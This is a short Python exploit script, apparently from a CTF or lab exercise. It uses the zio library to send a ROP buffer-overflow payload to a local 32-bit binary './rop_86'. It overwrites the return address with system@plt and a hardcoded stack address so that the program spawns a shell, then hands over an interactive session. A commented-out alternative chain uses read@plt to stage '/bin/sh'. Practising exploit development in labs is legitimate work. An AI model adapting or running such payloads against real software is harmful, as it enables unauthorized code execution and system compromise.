#!/usr/bin/env python
# coding:utf-8

import zio

def getJunk(size):
    result = ""
    for i in range(size):
        result += chr(ord("A") + i) * 4
    return result

junk = getJunk(7)
read_plt = zio.l32(0x08048360)
system_plt = zio.l32(0x08048390)
data_address = zio.l32(0x0804A000)
pop_pop_pop_ret = zio.l32(0x080485C9)

# payload = getJunk(6) + "\x00" * 4 + read_plt + pop_pop_pop_ret + zio.l32(0) + data_address + zio.l32(len("/bin/sh\n")) + system_plt + "BBBB" + data_address
payload = getJunk(6) + "\x00" * 4 + system_plt + "BBBB" + zio.l32(0xbffff871)

with open("payload", "w") as f:
    f.write(payload)

Io = zio.zio("./rop_86")
Io.write(payload)
#Io.write("/bin/sh\n")
Io.interact()
